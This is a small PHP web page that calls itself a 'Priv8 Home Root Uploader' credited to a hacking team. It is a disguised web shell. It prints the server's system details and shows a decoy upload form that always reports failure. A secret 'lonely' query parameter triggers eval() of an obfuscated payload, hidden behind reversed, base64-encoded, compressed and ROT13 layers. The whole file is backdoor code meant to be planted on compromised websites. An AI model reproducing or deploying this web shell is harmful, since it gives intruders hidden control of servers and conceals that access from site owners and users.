<html>
<i>Priv8 Home Root Uploader by xLon3ly</i> - Obsidian Cyber Team<br>
<?php
echo "<b>".php_uname()."</b><br>"
?>
<form action='?gagal' method='post' enctype='multipart/form-data'>
	  <input type='file'>
	  <input type='submit' value='upload'>
	  </form>
<?php if(isset($_GET["gagal"])){ ?>
<script>alert('gagal upload cok! mau nikung?')</script>
<?php } ?>
<br>
<?php if(isset($_GET["lonely"])){ ?>
<?php
eval(str_rot13(gzinflate(base64_decode(strrev('=UQ/8KRcKofC+nGTakuVlAqnTuCi2zR+te835dwhY9v0r7o5cB/bAnMdv3gIAqcWOKsDgweI4eW1tA6bBwQki5P7i9UMJWmc5loMET5JUaFkoaRzHQNTEISYhvv6FsdrjBYsCMUwwrTzU/kywg3fcqR/EjyuBNQjK+MPbi4yj6AMfWFjPmwolqq+uxesAi3AgHoirya6bOr9p2wTrR9sHy3zWBJmttWxrnsD/c4v7OLitLvrWWkpNrZpM480kgOURbEEMeb1vlap20wxUvldw4l29WW+jTv3k+0p9anjpZKW8ee9Pvc76vH63+SX+5VtiNdAgJ8EaB2kPSImfIz5u+llSwPEhKhyyTHbzIb5f0w+43l+N675FhyIWVTrDaQcZ1EiDgLJJDEmlcgr3zA1Klpljj6Fl2HsZTHClhgqFgakZfaQdnkbwE4IbCKVk1lFZ6apsnNRlphkisnXy6naGCjDkuWvTy2g5sJL817P2ME3BqFYNeaLVGCjjcj3mdf5E6F0knzNOmlX/ntcicSJS2guSaMWB3AsyO1a7FnJWzcdUTePaheWAxEG/h8aPXIEws9iBFZl')))));
?>
<?php } ?>
</html>
